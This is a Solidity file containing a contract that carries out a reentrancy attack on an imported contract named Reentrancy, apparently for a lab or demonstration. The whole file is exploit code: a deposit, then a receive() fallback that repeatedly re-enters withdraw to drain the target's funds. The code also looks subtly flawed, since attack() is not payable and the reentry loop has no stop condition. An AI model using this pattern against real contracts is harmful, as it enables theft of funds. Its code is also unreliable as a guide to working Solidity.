// ReentrancyAttacker.sol
pragma solidity ^0.8.0;

import "./REEnt.sol";

contract ReentrancyAttacker {
    Reentrancy public reentrancy;

    constructor(address _reentrancy) {
        reentrancy = Reentrancy(_reentrancy);
    }

    receive() external payable {
        // Call the withdraw function multiple times to simulate reentrancy
        for (uint i = 0; i < 10; i++) {
            reentrancy.withdraw(1 ether);
        }
    }

    function attack() public {
        // Deposit Ether into Reentrancy
        uint depositAmount = 1 ether;
        reentrancy.deposit{value: depositAmount}();

        // Withdraw Ether from Reentrancy
        uint withdrawAmount = 1 ether;
        reentrancy.withdraw(withdrawAmount);
    }
}
